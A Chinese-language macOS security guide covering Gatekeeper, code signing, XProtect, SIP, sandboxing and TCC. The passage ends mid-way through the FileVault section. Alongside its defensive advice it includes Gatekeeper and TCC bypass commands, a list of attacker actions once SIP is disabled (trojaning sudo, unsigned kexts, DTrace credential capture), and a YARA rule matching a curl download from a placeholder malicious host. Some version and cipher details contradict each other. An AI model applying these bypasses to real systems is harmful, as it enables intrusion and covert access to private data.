# macOS 终端安全详解

> 本文档深入讲解 macOS 终端安全的各个方面，包括安全架构、Gatekeeper 与代码签名、XProtect/MRT、SIP、沙箱机制、FileVault 磁盘加密、权限与访问控制、网络安全、安全加固、取证与应急响应，以及 macOS 与 Windows 安全对比，适合安全运维人员和 macOS 系统管理员参考。

---

## 一、macOS 安全架构概述

### 1.1 操作系统架构（Darwin/XNU 内核）

macOS 的底层操作系统为 Darwin，其核心是 XNU（X is Not Unix）内核。XNU 是一个混合内核，由两个部分组合而成：

| 组件 | 来源 | 职责 |
|------|------|------|
| Mach 微内核 | Carnegie Mellon University | 进程管理、线程调度、IPC（消息传递）、虚拟内存管理、异常处理 |
| BSD 层 | FreeBSD | 进程凭证（POSIX 用户/组）、文件系统 VFS、网络协议栈（TCP/IP）、信号、套接字 API |
| I/O Kit | Apple | 设备驱动框架，基于 C++，支持热插拔、电源管理 |

**Mach 与 BSD 的协作关系**

```
用户态应用
    │
    ┌─────── 系统调用（BSD 层：POSIX 接口）──────────┐
    │                                                │
    │   ┌────────── XNU 内核 ──────────┐            │
    │   │  BSD 层                        │            │
    │   │  ├─ VFS / 文件系统             │            │
    │   │  ├─ 网络协议栈                 │            │
    │   │  ├─ 进程凭证 / 信号            │            │
    │   │  └─ 系统调用分发               │            │
    │   │                                │            │
    │   │  Mach 层                        │            │
    │   │  ├─ 任务/线程管理              │            │
    │   │  ├─ Mach IPC（Mach 端口消息）  │            │
    │   │  ├─ 虚拟内存管理               │            │
    │   │  └─ 调度器                     │            │
    │   │                                │            │
    │   │  I/O Kit                       │            │
    │   │  └─ 设备驱动                   │            │
    │   └────────────────────────────────┘            │
    │                                                    │
    └──────── Mach 陷阱（Mach trap：IPC 接口）────────┘
```

Mach 使用端口（port）进行 IPC 通信，每个端口有发送权和接收权。进程间通信通过 Mach 消息传递完成，这是 macOS 沙箱和权限隔离的基础。BSD 层则提供了 POSIX 兼容性，使 macOS 能运行标准 Unix 软件。

**关键安全概念——Mach 端口权限**

```bash
# 查看进程的 Mach 端口（需要开发者工具）
# launchd 持有 bootstrap port，是所有服务的入口
sudo lsmp -p <PID>         # 列出进程持有的 Mach 端口
sudo lsmp -p 1             # 查看 launchd（PID 1）的端口
```

### 1.2 安全设计理念

macOS 安全架构建立在以下核心理念之上：

| 设计理念 | 实现机制 | 说明 |
|----------|----------|------|
| 最小权限 | 沙箱（App Sandbox）、TCC | 应用默认只拥有最小权限，需显式请求 |
| 权限分离 | 管理员/标准用户分离、sudo | root 不直接登录，通过 sudo 提权 |
| 代码签名 | 代码签名 + Gatekeeper + Notarization | 仅运行可信来源的代码 |
| 系统完整性 | SIP（System Integrity Protection） | 系统目录不可修改，即使 root 也不行 |
| 硬件安全 | T2/Secure Enclave、启动链验证 | 从硬件层保障启动完整性和密钥安全 |
| 隐私保护 | TCC（透明度、同意与控制） | 应用访问敏感资源需用户明确授权 |
| 深度防御 | 多层安全机制叠加 | 单一机制被绕过不会导致全面失守 |

### 1.3 macOS vs Linux/Windows 安全模型对比

| 维度 | macOS | Linux | Windows |
|------|-------|-------|---------|
| 内核类型 | 混合内核（Mach + BSD） | 宏内核（monolithic） | 混合内核（NT） |
| 权限模型 | POSIX + TCC + 沙箱 | POSIX UID/GID + capabilities | SID/ACL + UAC + Integrity Level |
| 代码签名 | 强制（Gatekeeper + Notarization） | 可选（IMA/appraisal） | 可选（Authenticode + SmartScreen） |
| 系统保护 | SIP | 无原生等价（SELinux/AppArmor 可叠加） | TrustedInstaller + PatchGuard |
| 沙箱 | App Sandbox（seatbelt） | seccomp/namespaces（容器） | AppContainer/WDAG |
| 磁盘加密 | FileVault 2（XTS-AES-128） | LUKS/dm-crypt | BitLocker |
| 防火墙 | ALF + pfctl | iptables/nftables | Windows Defender Firewall |
| 企业管理 | MDM（JAMF/Profile Manager） | Ansible/Puppet/Spacewalk | GPO/Intune/SCCM |
| 恶意软件防护 | XProtect + MRT | 无内置（依赖第三方） | Windows Defender |
| 提权机制 | sudo | sudo/su | UAC/runas |

### 1.4 安全功能演进历史

| 版本 | 年份 | 安全增强 |
|------|------|----------|
| Mac OS X 10.0 (Cheetah) | 2001 | 基于 Unix 的 Darwin 内核，引入 NetInfo |
| Mac OS X 10.5 (Leopard) | 2007 | 引入代码签名、ALF 防火墙、沙箱（seatbelt 预览） |
| Mac OS X 10.6 (Snow Leopard) | 2009 | 引入沙箱机制（sandboxd）、ASLR（部分） |
| Mac OS X 10.7 (Lion) | 2011 | FileVault 2（全盘加密）、Gatekeeper 预览 |
| OS X 10.8 (Mountain Lion) | 2012 | Gatekeeper 正式启用、XProtect 引入 |
| OS X 10.9 (Mavericks) | 2013 | 内存保护增强、App Nap |
| OS X 10.10 (Yosemite) | 2014 | CloudKeychain、连续性安全增强 |
| OS X 10.11 (El Capitan) | 2015 | SIP 正式引入、强制 ASLR |
| macOS 10.12 (Sierra) | 2016 | SIP 增强统一日志系统预览、SSH 密钥管理 |
| macOS 10.13 (High Sierra) | 2017 | APFS 文件系统、Secure Enclave 预览、Gatekeeper 增强 |
| macOS 10.14 (Mojave) | 2018 | TCC 全面引入（全磁盘访问等）、统一日志系统（OSLog）正式版 |
| macOS 10.15 (Catalina) | 2019 | Zsh 为默认 Shell、只读系统卷、增强实时监控 |
| macOS 11 (Big Sur) | 2020 | Notarization 强制要求、加密系统卷、M1 芯片支持 |
| macOS 12 (Monterey) | 2021 | 隐私报告、邮件隐私保护、iCloud+ 中继 |
| macOS 13 (Ventura) | 2022 | 快速安全响应更新、通行密钥（Passkeys）、增强检测 |
| macOS 14 (Sonoma) | 2023 | 敏感操作生物识别、钱包密钥共享 |
| macOS 15 (Sequoia) | 2024 | 嵌入式 Notarization 强制、Safari 沙箱增强、Game Mode 安全改进 |

---

## 二、Gatekeeper 与代码签名

### 2.1 Gatekeeper 工作机制

Gatekeeper 是 macOS 的应用来源验证系统，首次引入于 OS X 10.8（Mountain Lion）。其核心目标是确保用户仅运行来自可信来源且未被篡改的软件。

**Gatekeeper 验证流程**

```
用户下载/打开应用
    │
    ▼
检查 com.apple.quarantine 扩展属性（隔离标志）
    │
    ├─ 无 quarantine 标志 → 直接执行（本地编译/非浏览器下载）
    │
    └─ 有 quarantine 标志 → Gatekeeper 拦截验证
            │
            ▼
        ① 验证代码签名有效性（签名是否完整、证书是否有效）
            │
            ├─ 签名无效 → 阻止执行，提示"已损坏"
            │
            └─ 签名有效 → ② 验证 Notarization 票据（Apple 公证章）
                    │
                    ├─ 未公证 → 阻止执行，提示"无法验证开发者"
                    │
                    └─ 已公证 → ③ 检查 Gatekeeper 策略设置
                            │
                            ├─ 仅允许 App Store → 验证来源
                            ├─ App Store + 识别开发者 → 允许执行
                            └─ 任意来源 → 允许执行（已废弃默认）
```

**quarantine 属性**

```bash
# 查看文件的隔离属性
xattr -l /Applications/SomeApp.app

# 输出示例：
# com.apple.quarantine: 0083;5f3a2b1c;Safari;6D4F2A1B-...

# 手动添加 quarantine 属性（测试用）
xattr -w com.apple.quarantine "0083;5f3a2b1c;Safari;ABC123" /path/to/app

# 移除 quarantine 属性（绕过 Gatekeeper，不推荐在生产环境使用）
xattr -d com.apple.quarantine /path/to/app
```

**Gatekeeper 策略管理**

```bash
# 查看当前 Gatekeeper 状态
spctl --status
# 输出：assessments enabled

# 查看评估策略
spctl --assess --verbose /Applications/SomeApp.app
# 输出示例：
# /Applications/SomeApp.app: accepted
# source=Notarized Developer ID

# 临时允许所有来源（macOS Sierra 以后默认隐藏此选项）
sudo spctl --master-disable

# 重新启用 Gatekeeper
sudo spctl --master-enable

# 添加规则允许特定应用
spctl --add /Applications/TrustedApp.app
spctl --add-label "MyLabel" /Applications/TrustedApp.app
```

### 2.2 代码签名原理

macOS 代码签名基于 PKI 体系，确保应用来源可信且未被篡改。

**证书类型**

| 证书类型 | 用途 | 签名对象 |
|----------|------|----------|
| Development | 开发调试 | 开发阶段应用 |
| Developer ID Application | 分发给终端用户 | 非 App Store 分发的应用 |
| Developer ID Installer | 分发安装包 | .pkg/.dmg 安装包 |
| Mac App Distribution | App Store 分发 | App Store 上架应用 |
| Developer Installer | App Store 安装包 | App Store .pkg |
| ad-hoc | 无证书签名 | 内部工具/测试 |

**签名流程与验证**

```bash
# 查看应用代码签名信息
codesign -dv --verbose=4 /Applications/SomeApp.app

# 输出示例：
# Identifier=com.example.someapp
# Authority=Developer ID Application: Example Corp (TEAMID123)
# Authority=Developer ID Certification Authority
# Authority=Apple Root CA
# TeamIdentifier=TEAMID123
# Notarization ticket=<ticket data>
# Timestamp=2024-09-01 12:00:00 +0000

# 验证签名完整性
codesign --verify --deep --strict --verbose=2 /Applications/SomeApp.app
# 输出：valid on disk / satisfies its Designated Requirement

# 签名应用（需持有 Developer ID 证书）
codesign --sign "Developer ID Application: Example Corp (TEAMID123)" \
         --timestamp \
         --options runtime \
         /path/to/SomeApp.app

# 关键参数说明：
# --timestamp     : 包含受信任时间戳，证书过期后仍可验证
# --options runtime: 启用 Hardened Runtime（公证的强制要求）
# --deep           : 递归签名所有嵌套组件
```

**Hardened Runtime（硬化运行时）**

Hardened Runtime 是 Notarization 的强制前置要求，从 macOS 10.14 引入，限制应用的运行时行为：

```
Hardened Runtime 限制：
├─ 禁止动态代码签名（DYLD_INSERT_LIBRARIES 无效）
├─ 禁止进程内存写后执行（W^X，除非显式声明 entitlement）
├─ 禁止调试器附加（除非声明 com.apple.security.get-task-allow）
├─ 禁止加载未签名动态库
├─ 禁止 task_for_pid 调用（防止注入）
└─ 禁止 Apple 事件发送给其他进程（除非声明 entitlement）
```

### 2.3 公证（Notarization）流程

Notarization 是 Apple 对非 App Store 分发软件的自动化安全审查机制，从 macOS 10.15 起强制要求。

**公证流程**

```
开发者本地                           Apple 公证服务
    │                                    │
    1. 代码签名（Developer ID + Hardened Runtime）
    │                                    │
    2. 打包 .zip/.dmg                     │
    │                                    │
    3. xcrun notarytool submit ──────────→ 4. 自动扫描
    │     --apple-id ...                    ├─ 静态分析
    │     --team-id ...                     ├─ 恶意软件检测
    │     --password ...                    ├─ 代码签名验证
    │     /path/to/app.zip                 ├─ Hardened Runtime 检查
    │                                    │
    5. 轮询状态                           6. 返回结果
    │   xcrun notarytool history          │
    │                                    │
    7. 获取详细报告                        │
    │   xcrun notarytool log <id>         │
    │                                    │
    8. 通过后 staple 票据                  │
    │   xcrun stapler staple /path/app    │
    │                                    │
    9. 验证                               │
    │   spctl --assess /path/app          │
    │   xcrun stapler validate /path/app  │
```

**自动化公证脚本示例**

```bash
#!/bin/bash
APP_PATH="/path/to/MyApp.app"
ZIP_PATH="/tmp/MyApp.zip"
APPLE_ID="developer@example.com"
TEAM_ID="TEAMID123"
APP_PASSWORD="app-specific-password"

# 1. 压缩
ditto -c -k --keepParent "$APP_PATH" "$ZIP_PATH"

# 2. 提交公证
SUBMISSION_ID=$(xcrun notarytool submit "$ZIP_PATH" \
    --apple-id "$APPLE_ID" \
    --team-id "$TEAM_ID" \
    --password "$APP_PASSWORD" \
    --wait 2>&1 | grep "id:" | awk '{print $2}')

# 3. 检查结果
xcrun notarytool info "$SUBMISSION_ID" \
    --apple-id "$APPLE_ID" \
    --team-id "$TEAM_ID" \
    --password "$APP_PASSWORD"

# 4. Staple 票据
xcrun stapler staple "$APP_PATH"

# 5. 验证
xcrun stapler validate "$APP_PATH"
spctl --assess --verbose=4 "$APP_PATH"
```

### 2.4 Gatekeeper 绕过技术与防御

**常见绕过技术**

| 绕过技术 | 原理 | 防御建议 |
|----------|------|----------|
| 移除 quarantine 属性 | `xattr -d com.apple.quarantine` | 限制终端访问，MDM 策略禁止禁用 Gatekeeper |
| 利用 ad-hoc 签名 | 本地签名不需 Apple 证书 | 结合 Notarization 验证，非公证应用阻止 |
| 利用信任的已签名应用 | 劫持已签名应用的子进程/动态库 | Hardened Runtime + 库验证 |
| 利用 LaunchAgent/LaunchDaemon | 通过启动代理绕过 Gatekeeper | 监控 LaunchAgents，限制可写目录 |
| 利用挂载 DMG 绕过 | DMG 内某些操作不触发 Gatekeeper | 限制 DMG 自动挂载，终端监控 |
| 利用 Safari/邮件中继 | 某些下载途径不添加 quarantine | 保持系统更新，Notarization 强制 |
| DYLD 劫持 | 利用 DYLD_INSERT_LIBRARIES 注入 | Hardened Runtime 禁用环境变量注入 |

**防御建议**

```bash
# 企业环境 MDM 策略（Configuration Profile）
# 禁止用户关闭 Gatekeeper
# 键: com.apple.security.GKApproval
# 值: 限制为 App Store only 或 App Store + Developer ID

# 监控 quarantine 属性移除行为
log stream --predicate 'process == "xattr"' --info

# 监控 Gatekeeper 状态变更
log stream --predicate 'subsystem == "com.apple.syspolicy"' --info

# 定期审计系统完整性
spctl --status
spctl --assess --verbose /Applications/*.app 2>&1 | grep -v "accepted"
```

### 2.5 ad-hoc 签名与内部应用管理

```bash
# ad-hoc 签名（无证书，本地验证）
codesign -s - /path/to/internal-tool

# 指定 entitlements 文件签名
codesign -s - --entitlements entitlements.plist /path/to/app

# entitlements.plist 示例
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
</dict>
</plist>

# 内部应用管理最佳实践
# 1. 使用 MDM 部署内部应用，绕过 Gatekeeper
# 2. 建立内部 Developer ID 签名体系
# 3. 使用 MDM 配置白名单（spctl --add）
# 4. 定期审计 ad-hoc 签名的二进制文件
find /Applications -type f -exec sh -c \
  'codesign -dv "$1" 2>&1 | grep -q "adhoc" && echo "$1"' _ {} \;
```

---

## 三、XProtect 与 MRT

### 3.1 XProtect（恶意软件检测引擎）

XProtect 是 macOS 内置的防恶意软件系统，首次引入于 Mac OS X 10.6（Snow Leopard）。它基于特征匹配，使用 YARA 规则对下载的文件进行静态扫描。

**XProtect 工作机制**

```
文件下载（浏览器/邮件/AirDrop等）
    │
    ▼
触发 quarantine 属性标记
    │
    ▼
XProtect 后台扫描（LaunchDaemon: com.apple.XProtect.daemon）
    │
    ├─ 匹配 YARA 规则 → 阻止执行，通知用户
    │
    └─ 无匹配 → 放行
```

**XProtect 规则存储位置**

```
# XProtect 签名规则数据库
/System/Library/CoreServices/XProtect.bundle/Contents/Resources/

# 主要文件：
# XProtect.yara          — YARA 签名规则
# XProtect.meta.plist    — 规则元数据（版本号、更新时间）
# XProtect.gt500        — Gatekeeper 500 级别规则
```

**查看 XProtect 版本与规则**

```bash
# 查看 XProtect 版本
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A2 "XProtect"

# 通过软件更新检查 XProtect 版本
defaults read /Library/Preferences/com.apple.SoftwareUpdate \
  --file 2>/dev/null | grep -i "xprotect"

# 查看 XProtect YARA 规则内容（只读系统卷）
cat /System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara

# 强制检查 XProtect 更新
sudo softwareupdate --background
```

**XProtect YARA 规则示例（简化）**

```yara
// 概念示例，实际规则由 Apple 维护
rule Malware_Dropper_V1 {
    meta:
        description = "Known macOS dropper variant"
        version = "1.0"
    strings:
        $a = "osascript -e 'do shell script" wide ascii
        $b = { 4D 61 63 4F 53 20 44 72 6F 70 70 65 72 }
        $c = "curl -s http://malicious.example/payload" nocase
    condition:
        any of ($a, $b, $c)
}
```

### 3.2 MRT（Malware Removal Tool）

MRT 是 macOS 的恶意软件清除工具，与 XProtect 互补。XProtect 负责阻止，MRT 负责已感染系统的清理。

**XProtect 与 MRT 对比**

| 维度 | XProtect | MRT |
|------|----------|-----|
| 功能 | 预防（阻止已知恶意软件执行） | 清除（移除已安装的恶意软件） |
| 时机 | 文件下载后、执行前 | 系统启动时 + 定期扫描 |
| 技术 | YARA 特征匹配 | 特征匹配 + 清除逻辑 |
| 更新 | 随系统更新 + 后台静默更新 | 随系统更新 + 后台静默更新 |
| 位置 | /System/Library/CoreServices/XProtect.bundle | /Library/Apple/System/Library/CoreServices/MRT.app |

```bash
# 查看 MRT 版本
defaults read /Library/Apple/System/Library/CoreServices/MRT.app/Contents/Info.plist \
  CFBundleShortVersionString

# 查看 MRT 扫描记录
log show --predicate 'processImagePath CONTAINS "MRT"' --last 7d

# 手动触发 MRT 扫描（需要管理员权限）
sudo /Library/Apple/System/Library/CoreServices/MRT.app/Contents/MacOS/mrt \
  -a 2>&1
```

### 3.3 检测能力与局限性

**XProtect/MRT 的优势**

- 零配置，对用户透明
- Apple 官方维护，规则更新及时
- 系统级集成，不可轻易绕过（SIP 保护）
- 资源占用极低

**局限性**

| 局限 | 说明 |
|------|------|
| 纯特征匹配 | 无法检测零日威胁和无特征恶意软件 |
| 覆盖范围有限 | 主要针对已知 macOS 恶意软件家族 |
| 无行为监控 | 不监控运行时行为（无 EDR 能力） |
| 无网络检测 | 不检测 C2 通信或网络流量 |
| 更新延迟 | 规则更新依赖 Apple 推送，可能落后于威胁爆发 |

### 3.4 与商业 AV 产品的对比

| 维度 | XProtect + MRT | 商业 AV（如 CrowdStrike/SentinelOne） |
|------|----------------|---------------------------------------|
| 检测方式 | 特征匹配 | 行为分析 + ML + 特征 + 云端威胁情报 |
| 零日防护 | 无 | 有（行为分析/ML） |
| EDR 能力 | 无 | 有（进程链、网络、文件操作监控） |
| 响应能力 | 自动删除已知威胁 | 实时阻断、隔离、溯源 |
| 资源占用 | 极低 | 中等到高 |
| 企业管理 | 无 | 集中管理控制台 |
| 隐私影响 | 低 | 较高（需上报遥测数据） |

**企业环境建议**：macOS 终端在企业环境中应部署商业 EDR 产品作为补充，XProtect/MRT 仅作为基础防线，不可作为唯一安全机制。

---

## 四、SIP（系统完整性保护）

### 4.1 SIP 原理与保护范围

SIP（System Integrity Protection），又称 rootless，首次引入于 OS X 10.11（El Capitan）。其核心设计是即使拥有 root 权限，也无法修改受保护系统目录，从架构上限制 root 的能力。

**SIP 保护范围**

| 保护对象 | 路径 | 保护内容 |
|----------|------|----------|
| 系统目录 | /System | 系统二进制和框架不可修改 |
| 系统二进制 | /usr, /bin, /sbin | 命令行工具不可替换 |
| 预启动分区 | Preboot、Recovery | 启动相关文件不可修改 |
| Apple 品牌 | /Applications 中 Apple 应用 | 系统自带应用不可修改 |
| APFS 系统卷 | readonly (SSV) | 只读系统卷，整个系统签名验证 |
| 内核扩展 | /Library/Extensions | 仅签名 KEXT 可加载 |
| NVRAM | 特定变量 | 受保护的 NVRAM 变量不可修改 |
| DTrace | 受限 | 无法追踪受保护进程 |

**验证 SIP 保护**

```bash
# 查看 SIP 状态
csrutil status
# 输出：System Integrity Protection status: enabled.

# 查看 SIP 详细配置
csrutil status --verbose

# 尝试修改受保护目录（SIP 启用时会被拒绝）
sudo touch /System/test
# 错误：Read-only file system

sudo touch /usr/local/test
# /usr/local 不在 SIP 保护范围（可写）
```

### 4.2 SIP 对安全的影响

**正面影响**

- 防止恶意软件修改系统二进制文件进行持久化
- 阻止 rootkit 替换核心系统命令
- 保护内核扩展不被篡改
- 配合 SSV（Signed System Volume）实现全系统完整性校验
- 限制 DTrace 对受保护进程的追踪

**负面影响**

| 负面影响 | 说明 |
|----------|------|
| 调试受限 | 无法附加调试器到受保护进程 |
| 系统定制受限 | 无法修改系统级 UI 行为 |
| 取证工具受限 | 部分取证工具无法读取内核内存 |
| 合法工具被阻 | 某些系统管理工具无法操作受保护路径 |
| 安全研究受限 | 安全研究人员需禁用 SIP 才能进行内核研究 |

### 4.3 SIP 绕过技术

**禁用 SIP（需要恢复模式）**

```bash
# 步骤1: 重启进入恢复模式（Intel: Cmd+R；Apple Silicon: 长按电源键）

# 步骤2: 在恢复模式的终端中
csrutil disable
# 输出：Successfully disabled System Integrity Protection.

# 步骤3: 重启
reboot

# 步骤4: 验证（正常模式下）
csrutil status
# 输出：System Integrity Protection status: disabled.

# 重新启用 SIP（恢复模式）
csrutil enable

# 部分启用 SIP（高级配置）
# csrutil enable --without fs --without dtrace --without debug
# 可选参数：
#   --without fs      禁用文件系统保护
#   --without dtrace   禁用 DTrace 限制
#   --without debug    禁用调试限制
#   --without nvram   禁用 NVRAM 保护
#   --without kext     禁用 KEXT 验证
```

**SIP-less 环境风险**

在 SIP 禁用的环境中，攻击者可以：

```
1. 替换系统二进制文件 → 实现持久化后门
   sudo cp /tmp/evil_binary /usr/bin/sudo

2. 修改系统框架 → 注入恶意代码
   sudo cp /tmp/evil.dylib /System/Library/Frameworks/...

3. 加载未签名 KEXT → 内核级 rootkit
   sudo kextload /tmp/evil.kext

4. 修改 NVRAM → 启动级持久化
   sudo nvram boot-args="..."

5. 使用 DTrace 追踪凭据 → 窃取密码
   sudo dtrace -n 'syscall::read:entry /pid==$target/ { ... }'
```

### 4.4 SIP 配置与定制化

**Apple Silicon 的安全策略层级**

```
macOS 安全启动链（Apple Silicon）：
┌──────────────────────────────────┐
│  Secure Enclave ROM              │  ← 硬件信任根
├──────────────────────────────────┤
│  iBoot Bootloader                │  ← 验证下一阶段签名
├──────────────────────────────────┤
│  macOS Kernel (kernelcache)      │  ← 签名验证
├──────────────────────────────────┤
│  Signed System Volume (SSV)      │  ← APFS 快照 + 加密
├──────────────────────────────────┤
│  System Integrity Protection     │  ← 运行时保护
├──────────────────────────────────┤
│  App Sandbox + TCC               │  ← 应用层隔离
└──────────────────────────────────┘

安全策略层级（Per-OS Security Level）：
  完全安全（Full Security）— 默认，最严格
   ↓ 可降低
  中等安全（Reduced Security）— 允许旧版内核扩展
   ↓ 可降低
  不安全（Permissive Security）— 允许未签名代码，禁用 SIP
```

**Apple Silicon 下管理 SIP**

```bash
# 在恢复模式中查看启动策略
csrutil status

# 设置启动磁盘安全策略（恢复模式）
# 降低安全策略（安装旧版 KEXT）
csrutil authenticated-root disable

# 完全安全策略（恢复后恢复默认）
csrutil authenticated-root enable

# 手动挂载系统卷为可写（需要 SSV 禁用，不推荐）
sudo mount -uw /
# 注意：此操作在 Apple Silicon + SSV 启用时无效
```

---

## 五、沙箱机制

### 5.1 macOS 沙箱架构

macOS 沙箱基于 seatbelt 技术（也称 sandboxd），通过内核级的 Trusted BSD（trustedbsd）策略模块实现。沙箱使用路径规则限制进程对文件系统、网络、IPC 等资源的访问。

**沙箱架构层次**

```
┌─────────────────────────────────────────────┐
│  用户应用                                    │
├─────────────────────────────────────────────┤
│  App Sandbox（用户态沙箱容器）               │
│  ├─ ~/Library/Containers/<bundle-id>/Data/  │
│  │   ├─ Documents/                          │
│  │   ├─ Library/                            │
│  │   └─ tmp/                                │
│  ├─ Entitlements（声明所需权限）             │
│  └─ TCC 权限（运行时用户授权）               │
├─────────────────────────────────────────────┤
│  sandboxd（沙箱守护进程）                    │
│  ├─ 解析沙箱配置文件                         │
│  ├─ 应用访问控制规则                         │
│  └─ 记录违规操作                             │
├─────────────────────────────────────────────┤
│  Seatbelt（内核策略模块）                    │
│  ├─ trustedbsd MAC 框架                     │
│  ├─ 文件系统访问控制                         │
│  ├─ 网络访问控制                             │
│  ├─ Mach IPC 访问控制                        │
│  └─ 进程间操作控制                           │
├─────────────────────────────────────────────┤
│  XNU 内核                                    │
└─────────────────────────────────────────────┘
```

### 5.2 沙箱配置文件

macOS 沙箱使用 Scheme 风格的配置语言（非标准 PLIST）定义访问规则。

**沙箱配置文件示例**

```scheme
;; /usr/share/sandbox/system.sb — 系统级沙箱规则示例

;; 版本声明
(version 1)

;; 允许使用 Mach 自陷（系统调用）
(deny mach-privilege-set)

;; 文件系统规则
(allow file-read*              ; 允许读取
    (subpath "/System/Library"))
(allow file-read* file-write*
    (subpath "/tmp"))
(allow file-read* file-write*
    (subpath (var-darwin-user-home-dir) "/Library/Containers/com.example.app"))

;; 网络规则
(allow network-outbound
    (remote tcp "example.com:443"))
(deny network-outbound
    (remote tcp "*:25"))       ; 禁止 SMTP

;; IPC 规则
(allow ipc-posix-shm*
    (ipc-posix-name "apple.shm.notificationport"))

;; 进程操作
(deny process-info-pidinfo)    ; 禁止查询其他进程信息
(allow process-exec
    (subpath "/usr/bin"))       ; 允许执行 /usr/bin 下程序
```

**命令行沙箱工具**

```bash
# 使用预定义沙箱配置运行程序
sandbox-exec -f /path/to/profile.sb /path/to/program

# 使用内联沙箱配置运行
sandbox-exec -p '(version 1)(allow file-read* (subpath "/usr/share"))(deny file-write*)' \
    /bin/cat /etc/passwd

# 查看应用沙箱状态
sudo sandboxctl container list

# 查看沙箱容器目录
ls -la ~/Library/Containers/
```

### 5.3 容器化应用（App Sandbox、App Group）

**App Sandbox 容器结构**

```
~/Library/Containers/com.example.myapp/Data/
├── Documents/          # 应用的文档存储
├── Library/
│   ├── Application Support/
│   ├── Caches/
│   ├── Preferences/    # 用户偏好（UserDefaults）
│   └── Containers/    # 嵌套容器
├── tmp/                # 临时文件
└── .com.apple.containermanager # 容器元数据
```

**App Group（应用间共享容器）**

当多个应用属于同一开发团队时，可使用 App Group 共享数据：

```xml
<!-- Entitlements 中的 App Group 声明 -->
<key>com.apple.security.application-groups</key>
<array>
    <string>group.com.example.shared</string>
</array>

<!-- 共享容器路径 -->
<!-- ~/Library/Group Containers/group.com.example.shared/ -->
```

### 5.4 沙箱逃逸技术与案例分析

**常见沙箱逃逸路径**

| 逃逸技术 | 原理 | 案例 |
|----------|------|------|
| 符号链接逃逸 | 利用沙箱规则中的路径缺陷，通过符号链接访问外部路径 | 早期 macOS 沙箱的 `~/Library` 路径逃逸 |
| IPC 端口滥用 | 通过 Mach IPC 向非沙箱进程发送消息，间接执行操作 | 通过 `launchd` 提交 LaunchAgent |
| XPC 服务漏洞 | 利用沙箱外 XPC 服务的漏洞越权 | 多个 XPC 服务中的代码执行漏洞 |
| 自动保存路径 | 利用系统自动恢复功能的路径逃逸 | macOS Resume 功能路径逃逸 |
| Entitlement 滥用 | 利用合法应用的高权限 entitlement | `com.apple.security.cs.disable-library-validation` |

**案例分析：CVE-2020-3837（XPC 服务沙箱逃逸）**

```
漏洞概述：
  /usr/libexec/syspolicyd 是一个系统级 XPC 服务，负责 Gatekeeper
  评估。该服务未正确校验 XPC 消息发送者身份，沙箱内应用可向其
  发送伪造的评估请求，导致 Gatekeeper 绕过。

影响：
  恶意应用在沙箱内可绕过 Gatekeeper 验证，使未签名/未公证的应用
  获得执行权限。

修复：
  Apple 在 macOS 10.15.4 中加强 XPC 连接的身份验证。
```

### 5.5 TCC（Transparency, Consent, and Control）

TCC 是 macOS 10.14（Mojave）正式引入的隐私权限管理系统，控制应用对敏感资源的访问。

**TCC 保护资源**

| 资源类别 | TCC 服务名 | 说明 |
|----------|------------|------|
| 位置服务 | kTCCServiceLocation | GPS 位置信息 |
| 通讯录 | kTCCServiceAddressBook | 系统通讯录 |
| 日历 | kTCCServiceCalendar | 日历事件 |
| 提醒事项 | kTCCServiceReminders | 提醒事项 |
| 照片 | kTCCServicePhotos | 照片图库 |
| 摄像头 | kTCCServiceCamera | 摄像头访问 |
| 麦克风 | kTCCServiceMicrophone | 麦克风访问 |
| 全磁盘访问 | kTCCServiceSystemPolicyAllFiles | 全盘文件访问 |
| 桌面文件夹 | kTCCServiceSystemPolicyDesktopFolder | 桌面文件 |
| 文稿文件夹 | kTCCServiceSystemPolicyDocumentsFolder | 文稿文件 |
| 下载文件夹 | kTCCServiceSystemPolicyDownloadsFolder | 下载文件 |
| 网络卷 | kTCCServiceSystemPolicyNetworkVolumes | 网络存储 |
| 可移动卷 | kTCCServiceSystemPolicyRemovableVolumes | USB/外置存储 |
| 辅助功能 | kTCCServiceAccessibility | 控制其他应用窗口 |
| 输入监控 | kTCCServiceListenEvent | 键盘输入监控 |
| 屏幕录制 | kTCCServiceScreenCapture | 屏幕截图/录屏 |
| 焦点 | kTCCServiceFocusStatus | 勿扰模式状态 |
| 蓝牙 | kTCCServiceBluetooth | 蓝牙设备 |

**TCC 数据库**

```bash
# 用户级 TCC 数据库
~/Library/Application Support/com.apple.TCC/TCC.db

# 系统级 TCC 数据库（需全磁盘访问）
/Library/Application Support/com.apple.TCC/TCC.db

# 查看 TCC 数据库内容（需要全磁盘访问权限 + sqlite3）
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, service, auth_value FROM access ORDER BY service;"

# 输出示例：
# client           service                         auth_value
# com.apple.Safari kTCCServiceCamera               2
# com.apple.Terminal kTCCServiceSystemPolicyAllFiles 2
# com.slack.Slack  kTCCServiceMicrophone           0

# auth_value: 0=denied, 2=allowed, 3=limited
```

**TCC 绕过技术**

```bash
# 1. 直接修改 TCC.db（需要 SIP 禁用或全磁盘访问权限）
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "INSERT OR REPLACE INTO access (service, client, auth_value) \
   VALUES ('kTCCServiceCamera', 'com.evil.app', 2);"

# 2. 利用 TCC 信任的进程（通过 Apple 签名应用中转）
#    某些 Apple 签名应用默认拥有 TCC 权限
#    攻击者可能利用这些应用间接访问资源

# 3. 利用 MDM 配置 profile 预授权
#    企业可通过 MDM Profile 预配置 TCC 权限

# 防御：监控 TCC 数据库变更
sudo log stream --predicate \
  'subsystem == "com.apple.TCC" AND category == "access"' --info
```

---

## 六、FileVault 磁盘加密

### 6.1 FileVault 2 原理

FileVault 2 引入于 Mac OS X 10.7（Lion），使用 XTS-AES-128 加密算法对整个磁盘进行全盘加密。

**加密原理**

```
XTS-AES-128（XEX-based Tweaked-codebook mode with ciphertext Stealing）

  ┌─────────────────────────────────────────┐
  │  密钥结构                                │
  │  ├─ 数据加密密钥（DEK）：AES-256        │
  │  │   用于实际数据加密                     │
  │  ├─ 卷主密钥（VMK）：包装 DEK            │
  │  │   由用户密码/恢复密钥包装              │
